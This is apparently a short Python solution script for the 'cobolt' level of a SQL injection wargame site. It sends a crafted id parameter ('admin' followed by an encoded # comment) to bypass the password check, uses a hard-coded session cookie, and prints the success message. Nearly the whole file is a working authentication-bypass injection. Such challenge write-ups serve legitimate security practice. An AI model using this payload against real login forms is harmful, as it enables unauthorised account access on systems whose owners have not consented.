#!/usr/bin/env python3

'''
# Summary
- ignore PW part using # (%23)
'''


import requests

header = {"Cookie": "PHPSESSID=vdnm7k113d0u7ignerl94hf2o5;"}
url = "https://los.rubiya.kr/chall/cobolt_b876ab5595253427d3bc34f1cd8f30db.php"

payload = "?id=admin'%23"

response = requests.get(url + payload, headers=header)

result = response.text
if result.find("Clear!") != -1:
    end = result.split("Clear!")[0].split("<h2>")[1]
    print(end+"Clear!")